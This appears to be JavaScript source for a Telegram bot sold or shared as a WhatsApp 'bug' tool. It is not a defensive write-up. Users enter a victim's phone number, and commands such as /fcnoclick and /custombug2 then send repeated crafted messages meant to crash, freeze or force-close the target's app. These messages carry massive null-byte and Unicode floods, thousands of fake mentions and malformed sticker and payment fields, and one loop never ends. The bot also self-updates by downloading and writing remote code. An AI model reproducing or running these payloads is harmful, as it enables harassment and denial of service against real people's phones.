...
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://files.catbox.moe/r4lqtf.jpg",
];
...
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/ihsanzzz48-blip/tredict-db/refs/heads/main/Tokens.json";

bot.telegram.setMyCommands([
  { command: 'start', description: 'Developer Tercinta @devzxbl / @AlipsH1' },
...
├─────────────────────────────┤
│ DESENVOLVEDOR : Blueboerd | devzxbl 
│ TELEGRAMA : @devzxbl / @AlipsH1
│ CHANAL : https://t.me/XXOLLOFF
└─────────────────────────────┘
`));
...
async function checkExpired() {
    ...
    try {
        ...
        if (diff <= 0) {
            console.log("❌ SCRIPT EXPIRED, MOHON UNTUK MENUNGGU UPDATE DARI @devzxbl / @AlipsH1")
            process.exit(0);
        }
...
bot.command("custombug2", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  ...
  await ctx.replyWithPhoto("https://files.catbox.moe/r4lqtf.jpg", {
    ...
    try {
      ...
      for (const target of s.targets) {
        for (const bug of s.selected) {
          ...
          if (bug === "bulldo") {
            for (let i=0;i<100;i++){ await itembetmakloe(sock, target); await sleep(1500); }
          }
            ...
            for (let i=0;i<50;i++){ await itembetmakloe(sock, target); await sleep(1000); }
          }
          else if (bug === "fcclick") {
            for (let i=0;i<10;i++){ await FaiqForcloseUltimate(sock, target); await sleep(1000); }
          }
        }
        await sleep(1500);
      }
...
bot.action(/^custombug1_exec:(.+)$/, async (ctx) => {
  ...
  try {
    ...
    if (s.bulldo) for (let i=0;i<100;i++){ await itembetmakloe(sock, target); await sleep(1500);}
    if (s.delayfreeze) for (let i=0;i<100;i++){ await itembetmakloe(sock, target); await sleep(1500);}
    if (s.harddelay) for (let i=0;i<100;i++){ await itembetmakloe(sock, target); await sleep(1500);}
    if (s.bebasspam) for (let i=0;i<100;i++){ await itembetmakloe(sock, target); await sleep(1500);}
    if (s.stcb) for (let i=0;i<50;i++){ await itembetmakloe(sock, target); await sleep(1000);}
    if (s.fcclick) for (let i=0;i<10;i++){ await itembetmakloe(sock, target); await sleep(1000);}
  ...
  try {
    ...
    switch (bugType) {
      case "stcb":
        ...
        for (let i = 0; i < 60; i++) {
          await itembetmakloe(sock, target);
          await sleep(1000);
        }
        break;
      ...
      case "fcclick":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 10; i++) {
          await FaiqForcloseUltimate(sock, target);
          await sleep(1000);
        }
        break;
      ...
      case "bulldo":
        await ctx.reply("PROSES JANGAN SPAM BUTTON 🎯");
        for (let i = 0; i < 100; i++) {
          await itembetmakloe(sock, target); // Perbaikan penulisan parameter default ptcp
          await sleep(1000);
        }
        break;
...
bot.command("fcgb", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  ...
  const sent = await ctx.sendPhoto("https://files.catbox.moe/r4lqtf.jpg", {
    caption: `
...
`,
  ...
  await (async () => {
    for (let i = 0; i < 10; i++) {
        await FaiqForcloseUltimate(sock, target);
        await aglerefci(sock, target);
        await AglerForce(target);
        await sleep(1500);
    }
  })();
...
bot.command("xspam", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  ...
  await ctx.sendPhoto("https://files.catbox.moe/r4lqtf.jpg", {
    caption: `
...
bot.command("stcblank", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  ...
  const sent = await ctx.sendPhoto("https://files.catbox.moe/r4lqtf.jpg", {
    caption: `
<blockquote>💤 MODE : BLANK NO CLICK
...
bot.command("fcnoclick", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /fcnoclick 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
...
`,
  ...
  await (async () => {
    for (let i = 0; i < 100; i++) {
      await XBlankTos(target, Ptcp = false);
      await sleep(1500);
    }
  })();
...
const tesfunct = "https://files.catbox.moe/r4lqtf.jpg";
...
bot.command('addpremgroup', checkOwner, async (ctx) => {
  ...
  if (isGroupPremium(chatId)) {
    return ctx.replyWithPhoto('https://files.catbox.moe/r4lqtf.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ XX-OL ✞ 〕━━━┓
...
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "dєvєlσpєrs", url: "https://t.me/devzxbl" }]],
      },
    });
  } catch (error) {
...
bot.command("update", async (ctx) => {
  ...
  const repoRaw =
    "https://raw.githubusercontent.com/ihsanzzz48-blip/auto/refs/heads/main/xx.js";
  ...
  try {
    ...
    fs.writeFileSync("./InvicBlueX-up.js", data);
    ...
    console.error(e);
    ctx.reply(
      "❌ Update gagal. Pastikan repo dan file InvicBlueX-up.js tersedia."
    );
  }
});

/////////////////START FUNC/////////////////////////
async function HitamAwro(sock, target) {
    const payloadBlank = "𑇂𑆵𑆴𑆿".repeat(60000);
...
async function itembetmakloe(sock, target) {
  while (true) {
    const comboText = 
      "\0".repeat(100000) + 
      "\x10".repeat(100000) + 
...
              display_text: "𐌅𐌗𐌖 " + comboText,
              id: "fxv_" + Date.now().toString(36)
            })
          })),
          messageParams: new Array(500).fill("𐌅𐌗𐌖 " + comboText)
        },
        contextInfo: {
          isForwarded: true,
          forwardingScore: 999,
...
      participant: { jid: target },
      messageId: 'FXV-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 6)
    });
...
async function FaiqForcloseUltimate(sock, target) {
  try {
    const DataLockup = [
      { ID: "5126860596", uri: "t62.43144-24/10000000_790307790709311_669779370012050552_n.enc?ccb=11-4&oh", buffer: "11-4&oh=01_Q5Aa3QGnIg1qMpL5Isc7LmIdU1IpoFsCqXialsd2OW2w0QQyUw&oe", sid: "5e03e0", SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=", ENCSHA256: "7ovcifxdIivWXIJgLvrRtPfs+pPXen7hoXtnoFKdP4s=", mkey: "Wql96TBHCa44YVS6eAlHGI6aYIYg6yc0kuOr0Y9WvtI=" },
      { ID: "5126860596", uri: "t62.43144-24/10000000_1534257120961824_1506742782412655205_n.enc?ccb=11-4&oh", buffer: "11-4&oh=01_Q5Aa3QEE7wUPnOULMZhlwnOw_bhHK6Gn7YI0hKpVm3yvw5dGMw&oe", sid: "5e03e0", SHA256: "I2ky6mhJmsFYmA+XRBoiaiTeYwnXGQAVXym+P/9YN6Y=", ENCSHA256: "HyfU2MhgxBQFFIohXT68RNZa0MAZRxDYB4X1c3I7JQY=", mkey: "Q5V7iUFs67ewh1qOOkqwQ9avc3u7qXAhyh2fIgVITCU=" },
      { ID: "5126860596", uri: "t62.43144-24/10000000_1897784937438799_7647459696855315586_n.enc?ccb=11-4&oh", buffer: "01_Q5Aa3QGNjK1V4UGLF19HxU16vRNPFJQjy64pYSFbsuEm6bySdw&oe", sid: "5e03e0", SHA256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=", ENCSHA256: "RA4VN83TrKamnTjEolURSU7+2UUDY28EFBBQvFNh7e4=", mkey: "dTMN5/4/mFir4PcfgezcrIXqigJ8pl/COUQMxUsTaac=" }
    ];

    let seq = 0;
    let a = DataLockup[seq];
    seq = (seq + 1) % DataLockup.length;
    const b = a.ID, e = a.uri, f = a.buffer, g = a.sid, k = a.SHA256, l = a.ENCSHA256;
    a = a.mkey;
      ...
      viewOnceMessage: {
        message: {
          stickerMessage: {
            ...
            fileLength: { low: Math.floor(1000 * Math.random()), high: 0, unsigned: true },
            mediaKeyTimestamp: { low: Math.floor(17e8 * Math.random()), high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 10000 }, () => "1" + Math.floor(5e6 * Math.random()) + "@s.whatsapp.net")],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593
            },
            stickerSentTs: { low: Math.floor(-2e7 * Math.random()), high: 555, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
    ...
    await sock.relayMessage(target, generatedMsg.message, {
    ...
    await sock.relayMessage(target, msgv, {
      participant: { jid: target }
    });
      ...
      target,
      {
        interactiveMessage: {
          header: {
            ...
            locationMessage: {
              degreesLatitude: -6.2,
              degreesLongitude: 16.816666,
              name: "🐉⭑‌⟅‌༑ ▾⿻ 𝐅𝐀𝐈𝐐 ⧉ 𝐅𝐈𝐎𝐍𝐀▾‌‌⿻ ▾ ༑‌⟆‌⭑〽️",
              address: "R༙e༙a༙l༙s༙F༙a༙i༙q༙O༙f༙f༙c༙",
              jpegThumbnail: Buffer.alloc(10, "a").toString("base64"),
            },
          },
          body: {
            text: "👹⭑‌⟅‌༑ ▾⿻𝐅𝐀𝐈𝐐 ⧉ 𝐅𝐈𝐎𝐍𝐀▾‌‌ ⿻ ▾ ༑‌⟆‌⭑🩸R༙e༙a༙l༙s༙F༙a༙i༙q༙O༙f༙f༙c༙",
          },
          footer: {
            text: "#! -RealsFaiqOffc🇦🇱",
          },
          contextInfo: {
            ...
            isForwarded: true,
            externalAdReply: {
              title: "R༙e༙a༙l༙s༙F༙a༙i༙q༙O༙f༙f༙c༙👹",
              body: "𝐅𝐀𝐈𝐐 ⧉ 𝐅𝐈𝐎𝐍𝐀▾‌‌",
              thumbnailUrl: "https://i.imgur.com/xxx.jpg",
              sourceUrl: "https://RazaSync-í.dev👹⭑‌⟅‌༑ ▾⿻𝐅𝐀𝐈𝐐 ⧉ 𝐅𝐈𝐎𝐍𝐀▾‌‌ ⿻ ▾ ༑‌⟆‌⭑🩸",
              mediaType: 1,
              renderLargerThumbnail: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: "⭑‌⟅‌༑ ▾⿻ R༙e༙a༙l༙s༙F༙a༙i༙q༙O༙f༙f༙c༙‌‌‌ ⿻ ▾ ༑‌⟆‌⭑",
              newsletterJid: "123@newsletter",
              serverMessageId: 143,
            },
            businessMessageForwardInfo: {
              businessOwnerJid: sock.decodeJid ? sock.decodeJid(sock.user.id) : sock.user.id,
            },
          },
          nativeFlowMessage: {
            buttons: [
              ...
              { name: "booking_status", buttonParamsJson: JSON.stringify({}) },
              {
                ...
                buttonParamsJson: JSON.stringify({
                  currency: "IDR",
                  total_amount: { value: 0, offset: 10 },
                  reference_id: "x",
                  type: "physical-goods",
                  order: {
                    status: "payment_requested",
                    subtotal: { value: 0, offset: 10 },
                    order_type: "ORDER",
                    items: [{ name: "x", amount: { value: 0, offset: 10 }, quantity: 9999 }],
                  },
                }),
              },
            ],
    ...
    console.log(`[FAIQ] catalog done => ${target}`);
...
async function aglerefci(sock, target) {
  try {
    ...
    await sock.relayMessage("status@broadcast", agler.message, {
      statusJidList: [target],
      messageId: agler.key.id,
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
    ...
    console.log(`agler forger send bug to: ${target}`);
...
async function AglerForce(target) {
 const Maklo =  "𑇂𑆵𑆴𑆿".repeat(8000)
  const audi = {
    audioMessage: {
...
imageMessage: {
    ...
    viewOnceMessage: {
      message: {
        liveLocationMessage: {
          ...
          name: audi,
          url: "https://t.me/aglerinformation",
          contextInfo: {
            externalAdReply: {
              quotedAd: {
  ...
  await sock.relayMessage("status@broadcast", Agler, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [
      {
...
async function XBlankTos(target, Ptcp = false) {
        ...
        proto.Message.fromObject({
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "ꓘ𐌔𐌑 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" + ".᬴".repeat(40000),
                  locationMessage: {
                ...
                body: { text: "ꓘ𐌔𐌑 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂", },
                nativeFlowMessage: {
                  buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: ".᬴".repeat(50000),
                        sections: [{
                            title: ".᬴".repeat(30000),
